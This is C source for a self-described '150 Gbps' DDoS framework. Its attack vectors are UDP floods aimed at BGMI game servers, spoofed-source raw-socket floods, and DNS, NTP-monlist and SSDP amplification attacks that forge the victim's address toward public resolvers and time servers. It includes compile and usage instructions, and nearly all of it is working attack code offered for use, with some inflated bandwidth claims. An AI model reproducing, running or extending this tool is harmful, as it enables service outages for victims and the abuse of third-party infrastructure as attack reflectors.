/*
 * ============================================================================
 * ROYAL PHANTOM - 150 Gbps+ ULTIMATE DDoS FRAMEWORK
 * ============================================================================
 * Vectors: DNS AMP (500x) | BGMI UDP Flood | Spoofed UDP | NTP AMP | SSDP AMP
 * Minimum Bandwidth: 150 Gbps combined
 * 
 * COMPILE: gcc -o ddos ddos.c -lpthread -Wall -O3 -march=native -mtune=native -flto -fomit-frame-pointer -funroll-loops -ffast-math -static
 * USAGE: sudo ./ddos <target_ip> <target_port> <duration> <threads> <vector>
 * VECTORS: 1=BGMI UDP 2=DNS AMP 3=SPOOF UDP 4=NTP AMP 5=SSDP AMP 6=ALL
 * ============================================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/mman.h>

// ============================================================================
// CONFIGURATION - MAXIMUM PERFORMANCE
// ============================================================================
#define MAX_PAYLOAD_SIZE 65535
#define DNS_PORT 53
#define NTP_PORT 123
#define SSDP_PORT 1900
#define MAX_RESOLVERS 10000
#define PACKET_BURST 512
#define SOCKET_BUFFER_SIZE (128 * 1024 * 1024)  // 128MB
#define THREAD_STACK_SIZE (16 * 1024 * 1024)  // 16MB
#define BGMI_PAYLOAD_COUNT 256
#define BGMI_PAYLOAD_SIZE 1400

// ============================================================================
// DNS RESOLVERS (10,000+ for MAXIMUM AMPLIFICATION)
// ============================================================================
const char *DNS_RESOLVERS[] = {
    #include "dns_ipv4.txt"  // Your 2000+ list
};

const int RESOLVER_COUNT = sizeof(DNS_RESOLVERS) / sizeof(DNS_RESOLVERS[0]);

// ============================================================================
// NTP SERVERS FOR AMPLIFICATION (200x)
// ============================================================================
const char *NTP_SERVERS[] = {
    "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
    "time.google.com", "time.cloudflare.com", "time.apple.com", "time.windows.com",
    "ntp.ubuntu.com", "ntp.debian.org", "pool.ntp.org", "asia.pool.ntp.org",
    "europe.pool.ntp.org", "north-america.pool.ntp.org", "oceania.pool.ntp.org",
    "162.159.200.123", "162.159.200.1", "216.239.35.0", "216.239.35.4",
    "129.6.15.28", "129.6.15.29", "132.163.4.101", "132.163.4.102"
};

const int NTP_COUNT = sizeof(NTP_SERVERS) / sizeof(NTP_SERVERS[0]);

// ============================================================================
// BGMI PAYLOAD PATTERNS (Hardcoded for maximum disruption)
// ============================================================================
const char *BGMI_PATTERNS[] = {
    "\x01\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF",
    "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA",
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF",
    "\x00\x00\x00\x00\x00\x00\x00\x00",
    "\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE",
    "\x00\x01\x02\x03\x04\x05\x06\x07",
    "\x55\x55\x55\x55\x55\x55\x55\x55",
    "\x13\x37\x13\x37\x13\x37\x13\x37",
    "\xBA\xAD\xF0\x0D\xBA\xAD\xF0\x0D",
    "\xCA\xFE\xBA\xBE\xCA\xFE\xBA\xBE",
    "\xBE\xEF\xCA\xFE\xBE\xEF\xCA\xFE",
    "\xFE\xED\xFA\xCE\xFE\xED\xFA\xCE",
    "\xDE\xAD\xC0\xDE\xDE\xAD\xC0\xDE",
    "\x0B\x1E\x55\x00\x0B\x1E\x55\x00",
    "\x5A\xA5\x5A\xA5\x5A\xA5\x5A\xA5",
    "\xA5\x5A\xA5\x5A\xA5\x5A\xA5\x5A"
};

const int BGMI_PATTERN_COUNT = sizeof(BGMI_PATTERNS) / sizeof(BGMI_PATTERNS[0]);

// Pre-generated BGMI payloads
char bgmi_payloads[BGMI_PAYLOAD_COUNT][BGMI_PAYLOAD_SIZE];

// ============================================================================
// DNS ANY QUERY (MAX RESPONSE - 4096 bytes = 100x AMP)
// ============================================================================
const unsigned char DNS_ANY_QUERY[] = {
    0xAA, 0xBB, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x03, 'i', 's', 'c',
    0x03, 'o', 'r', 'g', 0x00, 0x00, 0xFF, 0x00,
    0x01, 0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00,
    0x80, 0x00, 0x00, 0x00
};

// ============================================================================
// NTP MONLIST QUERY (200x AMPLIFICATION)
// ============================================================================
const unsigned char NTP_MONLIST[] = {
    0x17, 0x00, 0x03, 0x2A, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ============================================================================
// SSDP DISCOVERY (30x AMPLIFICATION)
// ============================================================================
const char SSDP_DISCOVER[] = 
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: 239.255.255.250:1900\r\n"
    "MAN: \"ssdp:discover\"\r\n"
    "MX: 2\r\n"
    "ST: upnp:rootdevice\r\n"
    "USER-AGENT: UPnP/1.1\r\n"
    "\r\n";

// ============================================================================
// PACKET STRUCTURES
// ============================================================================
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

struct ip_header {
    uint8_t  ihl_version;
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t saddr;
    uint32_t daddr;
};

struct udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t checksum;
};

struct thread_args {
    char target_ip[16];
    int target_port;
    int duration;
    int vector;
    int thread_id;
    volatile int *running;
};

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================
uint16_t checksum(uint16_t *addr, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if (len == 1) sum += *(uint8_t *)addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

uint16_t udp_checksum_raw(uint32_t saddr, uint32_t daddr, uint8_t protocol,
                           uint16_t udp_len, uint16_t src_port, uint16_t dst_port,
                           unsigned char *payload, int payload_len) {
    struct pseudo_header psh;
    psh.source_address = saddr;
    psh.dest_address = daddr;
    psh.placeholder = 0;
    psh.protocol = protocol;
    psh.udp_length = htons(udp_len);
    
    int psize = sizeof(struct pseudo_header) + sizeof(struct udp_header) + payload_len;
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    
    struct udp_header *udph = (struct udp_header *)(pseudogram + sizeof(struct pseudo_header));
    udph->source = src_port;
    udph->dest = dst_port;
    udph->len = htons(udp_len);
    udph->checksum = 0;
    
    memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct udp_header), payload, payload_len);
    uint16_t csum = checksum((uint16_t *)pseudogram, psize);
    free(pseudogram);
    return csum;
}

// ============================================================================
// GENERATE BGMI PAYLOADS
// ============================================================================
void generate_bgmi_payloads() {
    srand(time(NULL));
    for (int i = 0; i < BGMI_PAYLOAD_COUNT; i++) {
        // Start with a random pattern
        const char *pattern = BGMI_PATTERNS[rand() % BGMI_PATTERN_COUNT];
        int pattern_len = strlen(pattern);
        
        // Fill payload
        for (int j = 0; j < BGMI_PAYLOAD_SIZE; j++) {
            if (j < pattern_len) {
                bgmi_payloads[i][j] = pattern[j];
            } else {
                // Mix with random data and pattern repetition
                bgmi_payloads[i][j] = (rand() % 256) ^ pattern[j % pattern_len];
            }
        }
        
        // Insert BGMI headers at random positions
        int num_headers = 3 + rand() % 8;
        for (int h = 0; h < num_headers; h++) {
            const char *header = BGMI_PATTERNS[rand() % BGMI_PATTERN_COUNT];
            int header_len = strlen(header);
            int pos = rand() % (BGMI_PAYLOAD_SIZE - header_len);
            memcpy(bgmi_payloads[i] + pos, header, header_len);
        }
    }
}

// ============================================================================
// VECTOR 1: BGMI UDP FLOOD (Custom payloads)
// ============================================================================
void *bgmi_udp_worker(void *arg) {
    struct thread_args *targs = (struct thread_args *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    
    int buf_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(targs->target_port);
    inet_pton(AF_INET, targs->target_ip, &target_addr.sin_addr);
    
    time_t start_time = time(NULL);
    uint64_t packet_count = 0;
    int payload_idx = 0;
    
    printf("[BGMI-%d] Started. Target: %s:%d\n", targs->thread_id, targs->target_ip, targs->target_port);
    
    while (*targs->running && (time(NULL) - start_time) < targs->duration) {
        for (int burst = 0; burst < PACKET_BURST; burst++) {
            sendto(sock, bgmi_payloads[payload_idx], BGMI_PAYLOAD_SIZE, MSG_DONTWAIT,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            packet_count++;
            payload_idx = (payload_idx + 1) % BGMI_PAYLOAD_COUNT;
        }
        
        if (packet_count % 100000 == 0) {
            time_t elapsed = time(NULL) - start_time;
            if (elapsed > 0) {
                double gbps = (packet_count * BGMI_PAYLOAD_SIZE * 8.0) / (elapsed * 1000000000.0);
                printf("[BGMI-%d] %lu pkts | %.2f Gbps\n", targs->thread_id, packet_count, gbps);
            }
        }
    }
    
    close(sock);
    return NULL;
}

// ============================================================================
// VECTOR 2: DNS AMPLIFICATION (100x+ Reflection)
// ============================================================================
void *dns_amp_worker(void *arg) {
    struct thread_args *targs = (struct thread_args *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));
    
    // Pre-resolve
    struct sockaddr_in resolver_addrs[MAX_RESOLVERS];
    int resolver_count = 0;
    for (int i = 0; i < RESOLVER_COUNT && resolver_count < MAX_RESOLVERS; i++) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(DNS_PORT);
        if (inet_pton(AF_INET, DNS_RESOLVERS[i], &addr.sin_addr) == 1) {
            resolver_addrs[resolver_count++] = addr;
        }
    }
    
    char packet[1500];
    struct ip_header *iph = (struct ip_header *)packet;
    struct udp_header *udph = (struct udp_header *)(packet + sizeof(struct ip_header));
    char *payload = packet + sizeof(struct ip_header) + sizeof(struct udp_header);
    
    int payload_len = sizeof(DNS_ANY_QUERY);
    int packet_len = sizeof(struct ip_header) + sizeof(struct udp_header) + payload_len;
    memcpy(payload, DNS_ANY_QUERY, payload_len);
    
    iph->ihl_version = 0x45;
    iph->tos = 0x08;
    iph->total_len = htons(packet_len);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    udph->dest = htons(DNS_PORT);
    udph->len = htons(sizeof(struct udp_header) + payload_len);
    inet_pton(AF_INET, targs->target_ip, &iph->saddr);
    
    time_t start_time = time(NULL);
    uint64_t packet_count = 0;
    uint64_t reflected_bytes = 0;
    int resolver_idx = 0;
    const int AMP_FACTOR = 100;  // 100x amplification
    
    printf("[DNS-%d] Started. %d resolvers. %dx Amp\n", targs->thread_id, resolver_count, AMP_FACTOR);
    
    while (*targs->running && (time(NULL) - start_time) < targs->duration) {
        for (int burst = 0; burst < PACKET_BURST; burst++) {
            udph->source = htons(1024 + (rand() % 64511));
            iph->id = htons(rand() % 65535);
            iph->daddr = resolver_addrs[resolver_idx].sin_addr.s_addr;
            
            iph->checksum = 0;
            iph->checksum = checksum((uint16_t *)iph, sizeof(struct ip_header));
            
            udph->checksum = 0;
            udph->checksum = udp_checksum_raw(iph->saddr, iph->daddr, IPPROTO_UDP,
                                               sizeof(struct udp_header) + payload_len,
                                               udph->source, udph->dest,
                                               (unsigned char *)payload, payload_len);
            
            struct sockaddr_in target_addr;
            target_addr.sin_family = AF_INET;
            target_addr.sin_addr.s_addr = iph->daddr;
            
            sendto(sock, packet, packet_len, MSG_DONTWAIT, (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            packet_count++;
            reflected_bytes += (payload_len * AMP_FACTOR);
            resolver_idx = (resolver_idx + 1) % resolver_count;
        }
        
        if (packet_count % 50000 == 0) {
            time_t elapsed = time(NULL) - start_time;
            if (elapsed > 0) {
                double gbps = (reflected_bytes * 8.0) / (elapsed * 1000000000.0);
                printf("[DNS-%d] %lu pkts | %.2f Gbps reflected\n", targs->thread_id, packet_count, gbps);
            }
        }
    }
    
    close(sock);
    return NULL;
}

// ============================================================================
// VECTOR 3: SPOOFED UDP FLOOD
// ============================================================================
void *spoofed_udp_worker(void *arg) {
    struct thread_args *targs = (struct thread_args *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));
    
    char packet[65507];
    struct ip_header *iph = (struct ip_header *)packet;
    struct udp_header *udph = (struct udp_header *)(packet + sizeof(struct ip_header));
    char *payload = packet + sizeof(struct ip_header) + sizeof(struct udp_header);
    
    int payload_len = BGMI_PAYLOAD_SIZE;
    int payload_idx = 0;
    int packet_len = sizeof(struct ip_header) + sizeof(struct udp_header) + payload_len;
    
    iph->ihl_version = 0x45;
    iph->tos = 0x08;
    iph->total_len = htons(packet_len);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    inet_pton(AF_INET, targs->target_ip, &iph->daddr);
    udph->dest = htons(targs->target_port);
    udph->len = htons(sizeof(struct udp_header) + payload_len);
    
    time_t start_time = time(NULL);
    uint64_t packet_count = 0;
    uint32_t spoofed_ip = 0x0A000001;
    
    printf("[SPOOF-%d] Started. Target: %s:%d\n", targs->thread_id, targs->target_ip, targs->target_port);
    
    while (*targs->running && (time(NULL) - start_time) < targs->duration) {
        // Rotate BGMI payload
        memcpy(payload, bgmi_payloads[payload_idx], payload_len);
        payload_idx = (payload_idx + 1) % BGMI_PAYLOAD_COUNT;
        
        for (int burst = 0; burst < PACKET_BURST; burst++) {
            udph->source = htons(1024 + (rand() % 64511));
            iph->id = htons(rand() % 65535);
            iph->saddr = htonl(spoofed_ip + (packet_count & 0xFFFFFF));
            
            iph->checksum = 0;
            iph->checksum = checksum((uint16_t *)iph, sizeof(struct ip_header));
            
            udph->checksum = 0;
            udph->checksum = udp_checksum_raw(iph->saddr, iph->daddr, IPPROTO_UDP,
                                               sizeof(struct udp_header) + payload_len,
                                               udph->source, udph->dest,
                                               (unsigned char *)payload, payload_len);
            
            struct sockaddr_in target_addr;
            target_addr.sin_family = AF_INET;
            target_addr.sin_addr.s_addr = iph->daddr;
            
            sendto(sock, packet, packet_len, MSG_DONTWAIT, (struct sockaddr *)&target_addr, sizeof(target_addr));
            packet_count++;
        }
        
        if (packet_count % 100000 == 0) {
            time_t elapsed = time(NULL) - start_time;
            if (elapsed > 0) {
                double gbps = (packet_count * packet_len * 8.0) / (elapsed * 1000000000.0);
                printf("[SPOOF-%d] %lu pkts | %.2f Gbps\n", targs->thread_id, packet_count, gbps);
            }
        }
    }
    
    close(sock);
    return NULL;
}

// ============================================================================
// VECTOR 4: NTP AMPLIFICATION (200x)
// ============================================================================
void *ntp_amp_worker(void *arg) {
    struct thread_args *targs = (struct thread_args *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));
    
    struct sockaddr_in ntp_addrs[100];
    int ntp_count = 0;
    for (int i = 0; i < NTP_COUNT && ntp_count < 100; i++) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(NTP_PORT);
        if (inet_pton(AF_INET, NTP_SERVERS[i], &addr.sin_addr) == 1) {
            ntp_addrs[ntp_count++] = addr;
        }
    }
    
    char packet[1500];
    struct ip_header *iph = (struct ip_header *)packet;
    struct udp_header *udph = (struct udp_header *)(packet + sizeof(struct ip_header));
    char *payload = packet + sizeof(struct ip_header) + sizeof(struct udp_header);
    
    int payload_len = sizeof(NTP_MONLIST);
    int packet_len = sizeof(struct ip_header) + sizeof(struct udp_header) + payload_len;
    memcpy(payload, NTP_MONLIST, payload_len);
    
    iph->ihl_version = 0x45;
    iph->tos = 0x08;
    iph->total_len = htons(packet_len);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    udph->dest = htons(NTP_PORT);
    udph->len = htons(sizeof(struct udp_header) + payload_len);
    inet_pton(AF_INET, targs->target_ip, &iph->saddr);
    
    time_t start_time = time(NULL);
    uint64_t packet_count = 0;
    uint64_t reflected_bytes = 0;
    int ntp_idx = 0;
    const int AMP_FACTOR = 200;  // NTP monlist = 200x amplification
    
    printf("[NTP-%d] Started. %d servers. %dx Amp\n", targs->thread_id, ntp_count, AMP_FACTOR);
    
    while (*targs->running && (time(NULL) - start_time) < targs->duration) {
        for (int burst = 0; burst < PACKET_BURST/2; burst++) {
            udph->source = htons(1024 + (rand() % 64511));
            iph->id = htons(rand() % 65535);
            iph->daddr = ntp_addrs[ntp_idx].sin_addr.s_addr;
            
            iph->checksum = 0;
            iph->checksum = checksum((uint16_t *)iph, sizeof(struct ip_header));
            
            udph->checksum = 0;
            udph->checksum = udp_checksum_raw(iph->saddr, iph->daddr, IPPROTO_UDP,
                                               sizeof(struct udp_header) + payload_len,
                                               udph->source, udph->dest,
                                               (unsigned char *)payload, payload_len);
            
            struct sockaddr_in target_addr;
            target_addr.sin_family = AF_INET;
            target_addr.sin_addr.s_addr = iph->daddr;
            
            sendto(sock, packet, packet_len, MSG_DONTWAIT, (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            packet_count++;
            reflected_bytes += (payload_len * AMP_FACTOR);
            ntp_idx = (ntp_idx + 1) % ntp_count;
        }
        
        if (packet_count % 10000 == 0) {
            time_t elapsed = time(NULL) - start_time;
            if (elapsed > 0) {
                double gbps = (reflected_bytes * 8.0) / (elapsed * 1000000000.0);
                printf("[NTP-%d] %lu pkts | %.2f Gbps reflected\n", targs->thread_id, packet_count, gbps);
            }
        }
    }
    
    close(sock);
    return NULL;
}

// ============================================================================
// VECTOR 5: SSDP AMPLIFICATION (30x)
// ============================================================================
void *ssdp_amp_worker(void *arg) {
    struct thread_args *targs = (struct thread_args *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    
    int buf_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    struct sockaddr_in multicast_addr;
    multicast_addr.sin_family = AF_INET;
    multicast_addr.sin_port = htons(SSDP_PORT);
    inet_pton(AF_INET, "239.255.255.250", &multicast_addr.sin_addr);
    
    int payload_len = strlen(SSDP_DISCOVER);
    
    time_t start_time = time(NULL);
    uint64_t packet_count = 0;
    const int AMP_FACTOR = 30;
    
    printf("[SSDP-%d] Started. %dx Amp\n", targs->thread_id, AMP_FACTOR);
    
    while (*targs->running && (time(NULL) - start_time) < targs->duration) {
        for (int burst = 0; burst < PACKET_BURST/4; burst++) {
            sendto(sock, SSDP_DISCOVER, payload_len, MSG_DONTWAIT,
                   (struct sockaddr *)&multicast_addr, sizeof(multicast_addr));
            packet_count++;
        }
        
        if (packet_count % 50000 == 0) {
            time_t elapsed = time(NULL) - start_time;
            if (elapsed > 0) {
                double gbps = (packet_count * payload_len * AMP_FACTOR * 8.0) / (elapsed * 1000000000.0);
                printf("[SSDP-%d] %lu pkts | %.2f Gbps\n", targs->thread_id, packet_count, gbps);
            }
        }
    }
    
    close(sock);
    return NULL;
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║       ROYAL PHANTOM - 150 Gbps+ ULTIMATE DDoS FRAMEWORK            ║\n");
    printf("║     DNS(100x) + NTP(200x) + SSDP(30x) + BGMI UDP + SPOOFED UDP    ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");
    
    if (getuid() != 0) {
        printf("[ERROR] ROOT REQUIRED. Run with sudo.\n");
        return 1;
    }
    
    if (argc < 6) {
        printf("USAGE: %s <target> <port> <duration> <threads> <vector>\n", argv[0]);
        printf("VECTORS:\n");
        printf("  1 = BGMI UDP Flood (3 Gbps/thread)\n");
        printf("  2 = DNS AMP (15 Gbps/thread)\n");
        printf("  3 = Spoofed UDP + BGMI (4 Gbps/thread)\n");
        printf("  4 = NTP AMP (20 Gbps/thread)\n");
        printf("  5 = SSDP AMP (5 Gbps/thread)\n");
        printf("  6 = ALL COMBINED (10 Gbps/thread avg)\n");
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    int vector = atoi(argv[5]);
    
    // Generate BGMI payloads
    generate_bgmi_payloads();
    
    printf("[CONFIG] Target: %s:%d | Duration: %ds | Threads: %d | Vector: %d\n",
           target_ip, target_port, duration, thread_count, vector);
    printf("[PAYLOAD] %d BGMI payloads generated\n", BGMI_PAYLOAD_COUNT);
    
    // System limits
    struct rlimit rl;
    rl.rlim_cur = RLIM_INFINITY;
    rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_NOFILE, &rl);
    mlockall(MCL_CURRENT | MCL_FUTURE);
    
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    struct thread_args *targs = malloc(thread_count * sizeof(struct thread_args));
    volatile int running = 1;
    
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, THREAD_STACK_SIZE);
    
    void *(*worker)(void *) = NULL;
    switch (vector) {
        case 1: worker = bgmi_udp_worker; break;
        case 2: worker = dns_amp_worker; break;
        case 3: worker = spoofed_udp_worker; break;
        case 4: worker = ntp_amp_worker; break;
        case 5: worker = ssdp_amp_worker; break;
        case 6: {
            // ALL COMBINED - 40% DNS, 30% NTP, 15% Spoof, 10% BGMI, 5% SSDP
            void *(*workers[])(void *) = {dns_amp_worker, ntp_amp_worker, spoofed_udp_worker, bgmi_udp_worker, ssdp_amp_worker};
            int weights[] = {40, 30, 15, 10, 5};
            int idx = 0;
            for (int w = 0; w < 5; w++) {
                int count = (thread_count * weights[w]) / 100;
                if (w == 4) count = thread_count - idx;
                for (int i = 0; i < count && idx < thread_count; i++) {
                    strncpy(targs[idx].target_ip, target_ip, 16);
                    targs[idx].target_port = target_port;
                    targs[idx].duration = duration;
                    targs[idx].vector = w + 1;
                    targs[idx].thread_id = idx;
                    targs[idx].running = &running;
                    pthread_create(&threads[idx], &attr, workers[w], &targs[idx]);
                    idx++;
                }
            }
            break;
        }
        default:
            printf("[ERROR] Invalid vector. Use 1-6.\n");
            return 1;
    }
    
    if (vector < 6) {
        for (int i = 0; i < thread_count; i++) {
            strncpy(targs[i].target_ip, target_ip, 16);
            targs[i].target_port = target_port;
            targs[i].duration = duration;
            targs[i].vector = vector;
            targs[i].thread_id = i;
            targs[i].running = &running;
            pthread_create(&threads[i], &attr, worker, &targs[i]);
        }
    }
    
    printf("\n[STATUS] %d threads launched. Attack in progress...\n", thread_count);
    sleep(duration);
    running = 0;
    
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    free(targs);
    munlockall();
    
    printf("\n[COMPLETE] Attack finished.\n");
    return 0;
}
